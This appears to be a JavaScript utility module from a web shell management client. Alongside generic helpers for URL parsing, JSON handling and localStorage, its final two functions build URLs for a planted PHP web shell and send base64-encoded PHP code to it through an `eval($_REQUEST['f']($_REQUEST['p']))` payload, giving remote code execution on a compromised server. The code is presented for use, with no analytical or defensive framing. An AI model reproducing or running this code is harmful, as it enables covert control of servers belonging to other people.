import request from './http'
import base64 from './base64'

export default {
    $console(v) {
        console.log(JSON.stringify(v, null, 4))
    },
    $clone(v) {
        return JSON.parse(JSON.stringify(v))
        // return Object.assign({},v)
    },
    // 解析url
    $parseURL(url) {
        const a = document.createElement('a')
        a.href = url
        return {
            host: a.hostname,
            port: a.port,
            query: a.search,
            params: (function () {
                const ret = {}
                const seg = a.search.replace(/^\?/, '').split('&')
                const len = seg.length
                let i = 0
                let s
                for (; i < len; i++) {
                    if (!seg[i]) {
                        continue
                    }
                    s = seg[i].split('=')
                    ret[s[0]] = s[1]
                }
                return ret
            }()),
            hash: a.hash.replace('#', ''),
        }
    },
    $jsonParse(v) {
        console.log(v)
        if (v !== undefined && v !== null && v !== '') {
            let temp
            try {
                temp = JSON.parse(`${v}`)
                console.log('json解析正常：', temp)
                if (typeof (temp) === 'number') {
                    return [temp]
                }
                return temp
            } catch (e) {
                console.log('json解析出错：', e)
                temp = [v]
                return temp
            }
        } else {
            return []
        }
    },
    $storageSet(key, value) {
        if (typeof value === 'object') {
            value = JSON.stringify(value)
        }
        localStorage.setItem(key, value)
    },
    $storageGet(key, default2 = '') {
        const value = localStorage.getItem(key) || default2
        try {
            return JSON.parse(value)
        } catch (e) {
            return value
        }
    },
    $storageRemove(key) {
        localStorage.removeItem(key)
    },
    $random() {
        return Math.random().toString(36).slice(2) + Date.now().toString(36)
    },

    //生成shell url
    $geneShellUrl(shell) {
        if (shell.url.indexOf('?') !== -1) {
            return shell.url + '&' + shell.pwd + '='
        }
        return shell.url + '?' + shell.pwd + '='
    },
    async $genRequest(shell, code, encode) {
        shell.encode = 'UTF-8'
        code = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + code

        let base64Str = base64._encode(code, false)
        // base64Str.replace(/ /g, '+')
        base64Str = encodeURIComponent(base64Str)

        let params = {f: 'base64_decode', p: base64Str, r: code}
        params[shell.pwd] = `eval($_REQUEST['f']($_REQUEST['p']));`
        // params[shell.pwd] = `eval(base64_decode(${base64Str}));`

        // console.log(params)
        if (shell.requestType === 1) {
            return request(shell.url, params, {}, 'POST')
        }
        return request(shell.url, {}, params)
    },
}
